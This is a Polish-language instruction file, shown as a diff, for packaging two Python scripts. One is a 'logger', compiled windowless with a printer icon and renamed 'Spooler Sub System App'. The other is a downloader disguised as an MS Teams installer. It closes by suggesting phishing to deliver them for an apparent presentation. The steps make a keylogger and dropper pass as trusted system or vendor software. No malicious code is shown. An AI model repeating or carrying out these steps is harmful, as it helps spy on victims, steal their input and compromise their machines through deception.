@@ -1,0 +1,12 @@
+1. musisz mieć pythona zainstalowanego
+2. pip install pyinstaller
+3. pyinstaller --onefile --noconsole --icon drukarka.ico logobf.py
+4. do folderu dist -> zmień sobie nazwę na :
+						Spooler Sub System App
+5. to jest sam logger
+6. przechodzisz do folderu pobieracz
+7. robisz to samo co w pkt. 3
+ale dla pewności podam Ci:
+				pyinstaller --onefile --noconsole --icon teams.ico MSTeamsSetup_c_l.py
+8. w tym folderze dist jest Twój "pobieracz" wszystkiego
+9. nie potrzebujesz żadnych z tych rzeczy na prezentację, oprócz linku, bo masz pokazać że się dostaje -> proponuje phising
